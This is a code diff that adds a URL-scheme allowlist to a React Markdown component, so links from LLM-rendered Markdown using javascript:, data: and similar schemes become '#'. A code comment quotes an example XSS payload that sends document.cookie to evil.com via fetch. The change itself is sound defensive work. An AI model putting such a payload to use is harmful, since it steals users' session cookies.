@@ -9,6 +9,37 @@ import { useMemo, type ReactNode } from "react";
  * appears to hug the final character instead of wrapping onto a new line
  * after a block element (paragraph/list/code/…).
  */
+
+/**
+ * Audit Phase-1A (PROBE-CRIT-028 / F-UI-001): allowlist of safe URL
+ * schemes for rendered <a> hrefs. Any href whose scheme is not in this
+ * set is replaced with '#' before reaching the DOM, so `javascript:`,
+ * `data:`, `vbscript:`, `file:`, etc. injection attempts from
+ * LLM-rendered Markdown are inert.
+ *
+ * https: and http: cover the regular web; mailto: covers the common
+ * "email me" link. tel: is included for mobile contexts. Everything
+ * else falls through to '#'.
+ */
+const _ALLOWED_HREF_SCHEMES = new Set(["https:", "http:", "mailto:", "tel:"]);
+function isSafeHref(href: string | undefined): boolean {
+  if (!href) return false;
+  const trimmed = href.trim();
+  if (!trimmed) return false;
+  // Relative links + fragment-only links (`/path`, `#anchor`, `?q=…`)
+  // are never script-bearing, so allow them.
+  const firstChar = trimmed[0];
+  if (firstChar === "/" || firstChar === "#" || firstChar === "?") return true;
+  try {
+    // Use a placeholder base so relative URLs don't throw; but at this
+    // point we already returned for path-shaped hrefs, so URL() will
+    // only run on scheme-bearing strings.
+    const u = new URL(trimmed);
+    return _ALLOWED_HREF_SCHEMES.has(u.protocol.toLowerCase());
+  } catch {
+    return false;
+  }
+}
 export function Markdown({
   content,
   highlightTerms,
@@ -325,10 +356,18 @@ function InlineContent({
               </em>
             );
           case "link":
+            // Audit Phase-1A (PROBE-CRIT-028 / F-UI-001): scheme
+            // allowlist. Without this, an LLM-generated message
+            // can render `<a href="javascript:fetch('//evil.com?
+            // c='+document.cookie)">click</a>` and stealing the
+            // session is one click away. We restrict the rendered
+            // href to https:, http:, and mailto: — every other
+            // scheme (javascript:, data:, file:, vbscript:, …)
+            // collapses to '#' so the link renders inert.
             return (
               <a
                 key={i}
-                href={node.href}
+                href={isSafeHref(node.href) ? node.href : "#"}
                 target="_blank"
                 rel="noreferrer"
                 className="text-primary underline underline-offset-2 decoration-primary/30 hover:decoration-primary/60 transition-colors"
